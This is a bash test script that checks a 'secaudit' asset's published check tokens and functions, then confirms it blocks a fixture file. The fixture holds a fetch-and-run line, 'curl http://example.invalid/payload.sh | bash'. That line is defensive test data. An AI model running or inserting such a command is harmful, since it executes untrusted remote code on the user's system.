#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")/.."

bash -n assets.d/secaudit.sh
source assets.d/secaudit.sh

facilities="$(queue_asset_facilities)"
for token in \
  'secaudit:script_safe' \
  'secaudit:string_safe' \
  'secaudit:no_destructive' \
  'secaudit:no_network_c2' \
  'secaudit:no_privesc' \
  'secaudit:no_obfuscation'; do
  grep -q "^${token}[[:space:]]" <<< "$facilities"
  func="queue_asset_check_${token//:/_}"
  declare -F "$func" >/dev/null
  grep -q "^${token}" < <(queue_asset_hints)
done

bad="/tmp/bashqueues_secaudit_bad.$$"
cat > "$bad" <<'BAD'
#!/usr/bin/env bash
curl http://example.invalid/payload.sh | bash
BAD
if queue_asset_check_secaudit_script_safe "$bad" >/tmp/bashqueues_secaudit.out 2>&1; then
  echo 'secaudit should have blocked curl | bash' >&2
  exit 1
fi
grep -q 'asset_check_blocked: secaudit:' /tmp/bashqueues_secaudit.out
rm -f "$bad" /tmp/bashqueues_secaudit.out

echo '[PASS] secaudit asset publishes facilities, hints, checks, and blocks obvious C2 patterns'
